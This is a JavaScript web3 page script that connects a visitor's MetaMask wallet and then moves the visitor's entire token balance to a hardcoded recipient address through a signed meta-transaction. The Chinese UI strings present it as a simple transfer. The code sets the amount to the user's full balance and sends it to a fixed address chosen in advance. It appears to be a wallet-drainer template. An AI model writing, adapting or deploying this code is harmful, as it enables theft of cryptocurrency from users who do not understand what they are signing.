const contractAddress = '0xa1f16EF58A572fB99e41bb2C21C26AdDd6828697';
const ABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "sender",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "recipient",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            },
            {
                "internalType": "bytes",
                "name": "signature",
                "type": "bytes"
            }
        ],
        "name": "executeMetaTransaction",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "sender",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "recipient",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

let web3;
let account;

async function connectWallet() {
    if (window.ethereum) {
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            web3 = new Web3(window.ethereum);
            account = window.ethereum.selectedAddress || (await web3.eth.getAccounts())[0];

            document.getElementById('connectButton').innerText = '连接成功';
            document.getElementById('transferButton').disabled = false;

            console.log('连接成功:', account);

            window.ethereum.on('accountsChanged', async (accounts) => {
                account = accounts[0];
                console.log('账户已更改:', account);
            });
        } catch (error) {
            console.error('连接钱包失败:', error);
            alert('连接钱包失败，请检查控制台错误信息。');
        }
    } else {
        alert('请安装 MetaMask 或其他钱包插件');
    }
}

async function transferTokens() {
    const recipient = '接收者地址'; // 在这里指定接收者地址
    const contract = new web3.eth.Contract(ABI, contractAddress);
    
    try {
        const balance = await contract.methods.balanceOf(account).call();
        const amount = balance; // 将转账金额设为用户的所有余额

        console.log('用户余额:', balance);

        if (amount === '0') {
            alert('余额不足，无法转账。');
            return;
        }

        const messageHash = web3.utils.soliditySha3(account, recipient, amount);
        const messageHashHex = web3.utils.keccak256(messageHash); // 使用 keccak256

        const signature = await web3.eth.personal.sign(messageHashHex, account);
        
        console.log('生成的消息哈希:', messageHashHex);
        console.log('签名:', signature);
        
        const tx = await contract.methods.executeMetaTransaction(account, recipient, amount, signature).send({ from: account });
        
        console.log('转账成功:', tx);
        alert('转账成功！');
    } catch (error) {
        console.error('转账失败:', error);
        alert('转账失败，请检查控制台错误信息。');
    }
}

document.getElementById('connectButton').onclick = connectWallet;
document.getElementById('transferButton').onclick = transferTokens;
